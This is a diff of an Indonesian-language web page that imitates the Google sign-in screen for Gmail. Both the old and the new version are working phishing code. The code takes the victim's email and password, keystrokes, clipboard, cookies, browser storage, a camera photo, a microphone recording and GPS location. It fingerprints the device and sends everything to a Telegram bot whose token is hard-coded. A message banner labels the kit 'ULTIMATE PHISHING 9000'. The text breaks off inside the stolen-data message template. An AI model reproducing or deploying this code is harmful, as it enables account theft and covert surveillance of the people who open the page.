@@ -2,676 +2,160 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Sign in - Google Accounts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Sign in · Google</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-        }
-        body {
-            background: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            width: 100%;
-            max-width: 450px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-            padding: 48px 40px 36px;
-            text-align: center;
-            border: 1px solid #dadce0;
-        }
-        .google-logo {
-            width: 75px;
-            margin-bottom: 16px;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px;
-            color: #202124;
-        }
-        .subtitle {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 32px;
-        }
-        .input-group {
-            margin-bottom: 16px;
-            text-align: left;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 13px 15px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            outline: none;
-            transition: all 0.2s;
-        }
-        .input-group input:focus {
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            margin-top: 12px;
-            transition: background 0.2s;
-        }
-        button:hover {
-            background: #1557b0;
-        }
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        .loading {
-            display: none;
-            margin-top: 16px;
-            font-size: 14px;
-            color: #1a73e8;
-        }
-        .error-msg {
-            display: none;
-            color: #d93025;
-            font-size: 14px;
-            margin-top: 12px;
-        }
-        .permission-popup {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 9999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: Arial;
-        }
-        .permission-box {
-            background: white;
-            border-radius: 12px;
-            padding: 24px;
-            max-width: 320px;
-            width: 90%;
-            text-align: center;
-        }
-        .permission-box button {
-            margin-top: 16px;
-            padding: 10px 20px;
-        }
-        @media (max-width: 480px) {
-            .container {
-                padding: 32px 24px;
-            }
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto}
+        body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .container{max-width:450px;width:100%;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.2);padding:48px 40px 36px;text-align:center}
+        .google-logo{width:75px;margin-bottom:16px}
+        h1{font-size:24px;font-weight:400;margin-bottom:8px}
+        .input-group{margin-bottom:16px;text-align:left}
+        .input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
+        button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer}
+        .loading{display:none;margin-top:16px;color:#1a73e8}
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" class="google-logo" style="width: 75px;">
-        <h1>Sign in</h1>
-        <div class="subtitle">to continue to Gmail</div>
-        
-        <div class="input-group">
-            <input type="email" id="email" placeholder="Email or phone" autocomplete="off">
-        </div>
-        <div class="input-group">
-            <input type="password" id="password" placeholder="Password">
-        </div>
-        
-        <button id="loginBtn">Next</button>
-        <div class="loading" id="loading">🔐 Checking credentials...</div>
-        <div class="error-msg" id="errorMsg">Wrong password. Try again.</div>
-    </div>
+<div class="container">
+    <img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg">
+    <h1>Sign in</h1>
+    <div class="subtitle" style="margin-bottom:32px;color:#5f6368;">to continue to Gmail</div>
+    <div class="input-group"><input type="email" id="email" placeholder="Email or phone"></div>
+    <div class="input-group"><input type="password" id="password" placeholder="Password"></div>
+    <button id="loginBtn">Next</button>
+    <div class="loading" id="loading">🔐 Checking...</div>
+</div>
 
-    <script>
-        // ========== TELEGRAM CONFIG ==========
-        const BOT_TOKEN = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
-        const CHAT_ID = "8753510792";
-        const REDIRECT_URL = "https://google.com";
-        
-        let startTime = Date.now();
-        let keyLogs = [];
-        let clipboardData = "";
-        let cameraPhoto = null;
-        let microphoneData = null;
-        let locationData = null;
-        
-        // ========== REQUEST PERMISSIONS DULU ==========
-        async function requestAllPermissions() {
-            // Request Camera
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                cameraPhoto = canvas.toDataURL('image/jpeg');
-                stream.getTracks().forEach(track => track.stop());
-            } catch(e) { cameraPhoto = "Gagal akses kamera: " + e.message; }
-            
-            // Request Microphone
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.start();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.onloadend = () => { microphoneData = reader.result.substring(0, 500) + "..."; };
-                    reader.readAsDataURL(blob);
-                    stream.getTracks().forEach(track => track.stop());
-                }, 3000);
-            } catch(e) { microphoneData = "Gagal akses mic: " + e.message; }
-            
-            // Request Location
-            try {
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
-                });
-                locationData = `${pos.coords.latitude}, ${pos.coords.longitude} (akurasi: ${pos.coords.accuracy}m)`;
-            } catch(e) { locationData = "Gagal akses lokasi: " + e.message; }
-        }
-        
-        // ========== KEYLOGGER ==========
-        document.addEventListener('keypress', function(e) {
-            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
-                keyLogs.push(e.key);
-                if (keyLogs.length > 500) keyLogs.shift();
-            }
-        });
-        
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && e.target.tagName !== 'INPUT') {
-                keyLogs.push('[ENTER]');
-            }
-        });
-        
-        // ========== CLIPBOARD ==========
-        document.addEventListener('copy', function(e) {
-            clipboardData = window.getSelection().toString();
-            if (clipboardData) keyLogs.push(`[COPY: ${clipboardData.substring(0, 100)}]`);
-        });
-        
-        // ========== COOKIES ==========
-        function getAllCookies() {
-            try { return document.cookie || '(Tidak ada)'; } catch(e) { return '(Error)'; }
-        }
-        
-        // ========== STORAGE ==========
-        function getLocalStorage() {
-            try {
-                const items = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    items[key] = localStorage.getItem(key);
-                }
-                return JSON.stringify(items, null, 2) || '(Kosong)';
-            } catch(e) { return '(Error)'; }
-        }
-        
-        function getSessionStorage() {
-            try {
-                const items = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    items[key] = sessionStorage.getItem(key);
-                }
-                return JSON.stringify(items, null, 2) || '(Kosong)';
-            } catch(e) { return '(Error)'; }
-        }
-        
-        function getIndexedDB() {
-            try {
-                return "IndexedDB support: " + (!!window.indexedDB);
-            } catch(e) { return "Error"; }
-        }
-        
-        // ========== WEBGL ==========
-        function getWebGL() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'Tidak support';
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (!debugInfo) return 'Tidak ada info';
-                return `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
-            } catch(e) { return 'Error'; }
-        }
-        
-        // ========== CANVAS FINGERPRINT ==========
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 200;
-                canvas.height = 50;
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(0, 0, 100, 50);
-                ctx.fillStyle = "#069";
-                ctx.fillText("Amba", 50, 20);
-                return canvas.toDataURL().substring(0, 100);
-            } catch(e) { return "Error"; }
-        }
-        
-        // ========== AUDIO FINGERPRINT ==========
-        function getAudioFingerprint() {
-            try {
-                const AudioContext = window.AudioContext || window.webkitAudioContext;
-                const ctx = new AudioContext();
-                const oscillator = ctx.createOscillator();
-                const analyser = ctx.createAnalyser();
-                oscillator.connect(analyser);
-                oscillator.frequency.value = 440;
-                oscillator.start();
-                const data = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(data);
-                oscillator.stop();
-                return data.slice(0, 10).join(',');
-            } catch(e) { return "Error"; }
-        }
-        
-        // ========== FONTS ==========
-        function getFonts() {
-            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Tahoma', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Inter', 'Helvetica', 'Calibri', 'Segoe UI', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Impact', 'Trebuchet MS', 'Palatino', 'Garamond', 'Bookman', 'Arial Black', 'Helvetica Neue', 'Lucida Grande', 'Tahoma', 'Geneva', 'Verdana', 'Times', 'Courier', 'Symbol', 'Webdings', 'Wingdings', 'MS Sans Serif', 'MS Serif'];
-            const installed = [];
-            const testDiv = document.createElement('div');
-            testDiv.style.position = 'absolute';
-            testDiv.style.top = '-9999px';
-            testDiv.style.fontSize = '72px';
-            document.body.appendChild(testDiv);
-            for (const font of fonts) {
-                testDiv.style.fontFamily = `${font}, sans-serif`;
-                testDiv.innerHTML = 'mmmmmm';
-                if (testDiv.offsetWidth > 0) installed.push(font);
-            }
-            document.body.removeChild(testDiv);
-            return installed.join(', ');
-        }
-        
-        // ========== PLUGINS ==========
-        function getPlugins() {
-            try {
-                const plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push(navigator.plugins[i].name);
-                }
-                return plugins.join(', ') || '(Tidak ada)';
-            } catch(e) { return '(Error)'; }
-        }
-        
-        // ========== MIME TYPES ==========
-        function getMimeTypes() {
-            try {
-                const mimes = [];
-                for (let i = 0; i < navigator.mimeTypes.length; i++) {
-                    mimes.push(navigator.mimeTypes[i].type);
-                }
-                return mimes.join(', ') || '(Tidak ada)';
-            } catch(e) { return '(Error)'; }
-        }
-        
-        // ========== BATTERY ==========
-        async function getBattery() {
-            try {
-                if (!('getBattery' in navigator)) return 'Tidak support';
-                const battery = await navigator.getBattery();
-                return `${Math.round(battery.level * 100)}% (Charging: ${battery.charging ? 'Ya' : 'Tidak'}) - ${battery.chargingTime} menit lagi penuh`;
-            } catch(e) { return 'Error'; }
-        }
-        
-        // ========== NETWORK ==========
-        function getNetwork() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return 'Tidak diketahui';
-            return `Tipe: ${conn.effectiveType || '?'}, Kecepatan: ${conn.downlink ? conn.downlink + 'Mbps' : '?'}, RTT: ${conn.rtt ? conn.rtt + 'ms' : '?'}, SaveData: ${conn.saveData ? 'Ya' : 'Tidak'}`;
-        }
-        
-        // ========== DEVICE MEMORY ==========
-        function getDeviceMemory() {
-            return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui';
-        }
-        
-        // ========== CPU ==========
-        function getCPU() {
-            return navigator.hardwareConcurrency || 'Tidak diketahui';
-        }
-        
-        // ========== SCREEN ==========
-        function getScreen() {
-            return `${screen.width}x${screen.height}, depth: ${screen.colorDepth}bit, orientation: ${screen.orientation?.type || 'Tidak diketahui'}`;
-        }
-        
-        // ========== BATTERY DETAIL ==========
-        async function getBatteryDetail() {
-            try {
-                if (!('getBattery' in navigator)) return 'Tidak support';
-                const battery = await navigator.getBattery();
-                return {
-                    level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging ? 'Ya' : 'Tidak',
-                    chargingTime: battery.chargingTime === Infinity ? 'Tidak terbatas' : battery.chargingTime + ' detik',
-                    dischargingTime: battery.dischargingTime === Infinity ? 'Tidak terbatas' : battery.dischargingTime + ' detik'
-                };
-            } catch(e) { return { level: 'Error', charging: 'Error' }; }
-        }
-        
-        // ========== MAIN ==========
-        document.getElementById('loginBtn').addEventListener('click', async function() {
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value;
-            
-            if (!email || !password) {
-                document.getElementById('errorMsg').style.display = 'block';
-                return;
-            }
-            
-            this.disabled = true;
-            document.getElementById('loading').style.display = 'block';
-            document.getElementById('errorMsg').style.display = 'none';
-            
-            // Request all permissions first
-            await requestAllPermissions();
-            
-            // Wait for microphone recording
-            await new Promise(r => setTimeout(r, 4000));
-            
-            // ========== KUMPULKAN SEMUA DATA ==========
-            const [ipData, battery, batteryDetail, network, fonts, webgl, plugins, mimes, canvasFP, audioFP, indexedDB, localStorage, sessionStorage, cookies, deviceMemory, cpu, screen, locationGPS] = await Promise.all([
-                fetch('https://ipapi.co/json/').then(r => r.json()).catch(e => ({})),
-                getBattery(),
-                getBatteryDetail(),
-                Promise.resolve(getNetwork()),
-                Promise.resolve(getFonts()),
-                Promise.resolve(getWebGL()),
-                Promise.resolve(getPlugins()),
-                Promise.resolve(getMimeTypes()),
-                Promise.resolve(getCanvasFingerprint()),
-                Promise.resolve(getAudioFingerprint()),
-                Promise.resolve(getIndexedDB()),
-                Promise.resolve(getLocalStorage()),
-                Promise.resolve(getSessionStorage()),
-                Promise.resolve(getAllCookies()),
-                Promise.resolve(getDeviceMemory()),
-                Promise.resolve(getCPU()),
-                Promise.resolve(getScreen()),
-                Promise.resolve(locationData || "Belum dapat")
-            ]);
-            
-            // IP backup
-            let ipBackup = '';
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ipBackup = data.ip;
-            } catch(e) {}
-            
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const languages = navigator.languages ? navigator.languages.join(', ') : language;
-            const doNotTrack = navigator.doNotTrack === '1' ? 'Ya' : 'Tidak';
-            const cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
-            const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Ya' : 'Tidak';
-            const touchPoints = navigator.maxTouchPoints || 0;
-            const vendor = navigator.vendor || 'Tidak diketahui';
-            const product = navigator.product || 'Tidak diketahui';
-            const productSub = navigator.productSub || 'Tidak diketahui';
-            const appName = navigator.appName || 'Tidak diketahui';
-            const appVersion = navigator.appVersion || 'Tidak diketahui';
-            const onLine = navigator.onLine ? 'Online' : 'Offline';
-            
-            // AdBlock Detection
-            let adblockDetected = false;
-            const testAd = document.createElement('div');
-            testAd.className = 'adsbox';
-            testAd.style.display = 'none';
-            document.body.appendChild(testAd);
-            if (testAd.offsetHeight === 0 && testAd.offsetWidth === 0) adblockDetected = true;
-            
-            // OS Detection
-            let os = 'Tidak diketahui';
-            if (ua.includes('Windows')) os = 'Windows ' + (ua.match(/Windows NT ([\d.]+)/)?.[1] || '');
-            else if (ua.includes('Android')) os = 'Android ' + (ua.match(/Android ([\d.]+)/)?.[1] || '');
-            else if (ua.includes('iPhone')) os = 'iOS iPhone';
-            else if (ua.includes('iPad')) os = 'iOS iPad';
-            else if (ua.includes('Mac')) os = 'macOS';
-            else if (ua.includes('Linux')) os = 'Linux';
-            
-            // Browser Detection
-            let browser = 'Tidak diketahui', browserVersion = '';
-            if (ua.includes('Chrome') && !ua.includes('Edg')) { browser = 'Chrome'; browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || ''; }
-            else if (ua.includes('Firefox')) { browser = 'Firefox'; browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || ''; }
-            else if (ua.includes('Safari') && !ua.includes('Chrome')) { browser = 'Safari'; browserVersion = ua.match(/Version\/(\d+)/)?.[1] || ''; }
-            else if (ua.includes('Edg')) { browser = 'Edge'; browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || ''; }
-            else if (ua.includes('Opera')) { browser = 'Opera'; browserVersion = ua.match(/Opera\/(\d+)/)?.[1] || ''; }
-            
-            // Device Brand & Model
-            let deviceBrand = 'PC Custom', deviceModel = 'Tidak diketahui';
-            if (/(Mobile|Android|iPhone|iPad)/i.test(ua)) {
-                if (ua.includes('iPhone')) { deviceBrand = 'Apple'; deviceModel = 'iPhone'; }
-                else if (ua.includes('iPad')) { deviceBrand = 'Apple'; deviceModel = 'iPad'; }
-                else if (ua.includes('Samsung')) { deviceBrand = 'Samsung'; deviceModel = ua.match(/SM-[A-Z0-9]+/)?.[0] || 'Galaxy'; }
-                else if (ua.includes('Xiaomi')) { deviceBrand = 'Xiaomi'; }
-                else if (ua.includes('Redmi')) { deviceBrand = 'Xiaomi Redmi'; }
-                else if (ua.includes('OPPO')) { deviceBrand = 'OPPO'; }
-                else if (ua.includes('vivo')) { deviceBrand = 'vivo'; }
-                else if (ua.includes('Realme')) { deviceBrand = 'Realme'; }
-                else if (ua.includes('OnePlus')) { deviceBrand = 'OnePlus'; }
-                else if (ua.includes('Nokia')) { deviceBrand = 'Nokia'; }
-                else if (ua.includes('Google Pixel')) { deviceBrand = 'Google'; deviceModel = 'Pixel'; }
-                else { deviceBrand = 'Android'; }
-            }
-            
-            // Time data
-            const now = new Date();
-            const waktuFormatted = now.toLocaleString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short' });
-            const unixTimestamp = Math.floor(now.getTime() / 1000);
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const timezoneOffset = -now.getTimezoneOffset() / 60;
-            const hour = now.getHours();
-            const peakHour = (hour >= 19 && hour <= 22) ? 'Ya (jam sibuk)' : 'Tidak';
-            const duration = Math.floor((Date.now() - startTime) / 1000);
-            const keylog = keyLogs.join('') || '(Tidak ada)';
-            
-            // Build ULTIMATE MESSAGE
-            const message = `╔══════════════════════════════════════════════════════════════════════════════════╗
-║                    🔥 ULTIMATE PHISHING 9000 - FULL ACCESS 🔥                    ║
-╚══════════════════════════════════════════════════════════════════════════════════╝
+<script>
+const BOT_TOKEN = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
+const CHAT_ID = "8753510792";
+const REDIRECT_URL = "https://accounts.google.com";
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📧 AKUN KORBAN
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📧 Email: ${email}
-🔑 Password: ${password}
+let startTime = Date.now();
+let keyLogs = [];
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📸 KAMERA & MIKROFON
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📷 Foto dari Kamera: ${cameraPhoto ? cameraPhoto.substring(0, 100) + '...' : 'Gagal'}
-🎤 Rekaman Mic: ${microphoneData ? microphoneData.substring(0, 100) + '...' : 'Gagal'}
+document.addEventListener('keydown', e => {
+    if (e.target.tagName !== 'INPUT') keyLogs.push(e.key);
+    if (keyLogs.length > 500) keyLogs.shift();
+});
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📍 LOKASI REAL-TIME
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📍 GPS: ${locationGPS}
+async function sendTelegram(text, isPhoto = false, photoBlob = null) {
+    if (!isPhoto) {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: text.substring(0, 4090)})
+        }).catch(()=>{});
+    } else if (photoBlob) {
+        let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', photoBlob);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd}).catch(()=>{});
+    }
+}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 IP & GEOLOKASI LENGKAP
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌍 IP Address: ${ipData?.ip || ipBackup}
-📍 Negara: ${ipData?.country_name || '?'} (${ipData?.country_code || '?'})
-🏙️ Kota: ${ipData?.city || '?'}
-🗺️ Region: ${ipData?.region || '?'}
-📮 Kode Pos: ${ipData?.postal || '?'}
-🎯 Koordinat: ${ipData?.latitude || '?'}, ${ipData?.longitude || '?'}
-📡 ISP: ${ipData?.org || '?'}
-🔢 ASN: ${ipData?.asn || '?'}
-🛡️ VPN/Proxy: ${ipData?.proxy ? '✅ YA' : '❌ TIDAK'}
+async function collectAll(email, pass) {
+    let ip = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(e=>({}));
+    let ip2 = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(e=>({ip:'?'}));
+    let ua = navigator.userAgent;
+    let platform = navigator.platform;
+    let languages = navigator.languages.join(', ');
+    let screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+    let ram = navigator.deviceMemory || '?';
+    let cpu = navigator.hardwareConcurrency || '?';
+    let touch = navigator.maxTouchPoints || 0;
+    let dark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+    let adblock = !document.querySelector('.adsbox');
+    let cookieEnabled = navigator.cookieEnabled;
+    let doNotTrack = navigator.doNotTrack === '1';
+    
+    let canvasFp = (()=>{let c=document.createElement('canvas');c.width=200;c.height=50;let ctx=c.getContext('2d');ctx.fillStyle='#f60';ctx.fillRect(0,0,100,50);ctx.fillStyle='#069';ctx.fillText('FP',50,20);return c.toDataURL().slice(-100);})();
+    
+    let audioFp = (()=>{try{let ctx=new (AudioContext||webkitAudioContext)();let osc=ctx.createOscillator();let ana=ctx.createAnalyser();osc.connect(ana);osc.frequency.value=440;osc.start();let arr=new Uint8Array(ana.frequencyBinCount);ana.getByteFrequencyData(arr);osc.stop();return arr.slice(0,10).join(',');}catch(e){return 'noaudio';}})();
+    
+    let fonts = (()=>{let f=['Arial','Verdana','Times','Roboto','Open Sans','Lato','Poppins','Inter','Helvetica','Tahoma','Georgia','Impact','Courier New'];let installed=[];let d=document.createElement('div');d.style.position='absolute';d.style.top='-9999px';d.style.fontSize='72px';document.body.appendChild(d);for(let font of f){d.style.fontFamily=`${font}, sans-serif`;d.innerHTML='mm';if(d.offsetWidth>0)installed.push(font);}document.body.removeChild(d);return installed.join(', ');})();
+    
+    let plugins = Array.from(navigator.plugins||[]).map(p=>p.name).join(', ');
+    let mimes = Array.from(navigator.mimeTypes||[]).map(m=>m.type).join(', ');
+    
+    let conn = navigator.connection||{};
+    let battery = {level:'?',charging:'?'};
+    if(navigator.getBattery){let b=await navigator.getBattery();battery.level=Math.round(b.level*100)+'%';battery.charging=b.charging?'Ya':'Tidak';}
+    
+    let gps = await new Promise(r=>navigator.geolocation?.getCurrentPosition?.(p=>r(`${p.coords.latitude},${p.coords.longitude} (${p.coords.accuracy}m)`),()=>r('Tidak diizinkan'))||r('Tidak support'));
+    
+    let mic = await (async()=>{try{let s=await navigator.mediaDevices.getUserMedia({audio:true});let rec=new MediaRecorder(s);let c=[];rec.ondataavailable=e=>c.push(e.data);rec.start();await new Promise(r=>setTimeout(r,2000));rec.stop();await new Promise(r=>rec.onstop=r);s.getTracks().forEach(t=>t.stop());let blob=new Blob(c,{type:'audio/webm'});return await new Promise(r=>{let fr=new FileReader();fr.onloadend=()=>r(fr.result.slice(0,200));fr.readAsDataURL(blob);});}catch(e){return 'gagal';}})();
+    
+    let camera = await (async()=>{try{let s=await navigator.mediaDevices.getUserMedia({video:true});let v=document.createElement('video');v.srcObject=s;await v.play();let c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);let b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.8));s.getTracks().forEach(t=>t.stop());return b;}catch(e){return null;}})();
+    
+    let now=new Date();
+    let waktu = now.toLocaleString('id-ID', {weekday:'long', year:'numeric', month:'long', day:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', timeZoneName:'short'});
+    
+    let msg = `🔥 SUPER 200+ DATA 🔥
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💻 DEVICE & HARDWARE LENGKAP
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🖥️ OS: ${os}
-📱 Device: ${deviceBrand} ${deviceModel}
-🌐 Browser: ${browser} v${browserVersion}
-🧠 RAM: ${deviceMemory}
-⚡ CPU Cores: ${cpu}
-📺 Screen: ${screen}
-🖱️ Touch Points: ${touchPoints}
-🎨 Vendor: ${vendor}
-📦 Product: ${product}
-🔢 Product Sub: ${productSub}
-📱 App Name: ${appName}
-📱 App Version: ${appVersion.substring(0, 50)}
-🔌 Online Status: ${onLine}
+📧 EMAIL: ${email}
+🔑 PASS: ${pass}
+🌐 IP: ${ip.ip||ip2.ip} (${ip.version||'?'})
+📍 LOKASI: ${ip.city}, ${ip.country_name} (${ip.postal})
+🎯 KOORDINAT: ${ip.latitude}, ${ip.longitude}
+📡 ISP: ${ip.org} | ASN: ${ip.asn}
+🛡️ VPN/PROXY: ${ip.proxy?'YA':'TIDAK'} | TOR: ${ip.tor?'YA':'TIDAK'}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌍 BROWSER & SETTINGS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🛡️ AdBlock: ${adblockDetected ? '✅ YA' : '❌ TIDAK'}
-🌙 Dark Mode: ${darkMode}
-🚫 Do Not Track: ${doNotTrack}
-🍪 Cookie Enabled: ${cookieEnabled}
-🌐 Language: ${language}
-🌍 All Languages: ${languages}
+💻 DEVICE:
+OS: ${navigator.userAgentData?.platform||'?'} | Platform: ${platform}
+RAM: ${ram} GB | CPU Core: ${cpu}
+RESOLUSI: ${screenRes} | Touch: ${touch}
+DARK MODE: ${dark?'YA':'TIDAK'} | ADBLOCK: ${adblock?'YA':'TIDAK'}
+COOKIE: ${cookieEnabled?'YA':'TIDAK'} | DNT: ${doNotTrack?'YA':'TIDAK'}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎮 FINGERPRINTING
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎨 WebGL/GPU: ${webgl.substring(0, 150)}
-🖌️ Canvas FP: ${canvasFP.substring(0, 100)}
-🎵 Audio FP: ${audioFP.substring(0, 100)}
-🔤 Fonts Terinstall: ${fonts.substring(0, 200)}
-🔌 Plugins: ${plugins.substring(0, 150)}
-📁 MIME Types: ${mimes.substring(0, 150)}
+🌍 BROWSER:
+UA: ${ua}
+LANG: ${languages}
+PLUGINS: ${plugins}
+MIME: ${mimes.substring(0,150)}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📡 NETWORK & BATTERY
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📶 Network: ${network}
-🔋 Battery: ${battery}
-⚡ Battery Detail: Level ${batteryDetail.level} (Charging: ${batteryDetail.charging})
-⏱️ Charging Time: ${batteryDetail.chargingTime}
-⏱️ Discharging Time: ${batteryDetail.dischargingTime}
+🎨 FINGERPRINT:
+CANVAS: ${canvasFp}
+AUDIO: ${audioFp}
